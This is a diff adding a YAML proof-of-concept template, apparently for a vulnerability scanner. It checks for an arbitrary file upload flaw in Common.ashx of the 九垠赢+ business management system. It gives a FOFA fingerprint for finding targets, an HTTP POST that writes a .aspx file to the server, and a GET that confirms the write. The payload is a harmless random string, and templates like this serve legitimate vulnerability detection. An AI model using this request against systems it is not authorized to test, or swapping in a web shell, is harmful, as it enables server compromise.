@@ -1,0 +1,31 @@
+id: poc-yaml-jiuyin-plus-bms-common-ashx-anyfile-upload
+info:
+  name: 九垠赢+商业管理系统 Common.ashx 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 九垠赢+商业管理系统
+  fofa: body="九垠赢+"
+variables:
+  t1: random_str(5)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /System/Common.ashx?type=savefile&path={{.t1}}.aspx
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+  data: '------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="content";
+
+    Content-Type: text/plain
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
+  expression: status_code == 200 && body == "1"
+- method: GET
+  path: /System/{{.t1}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
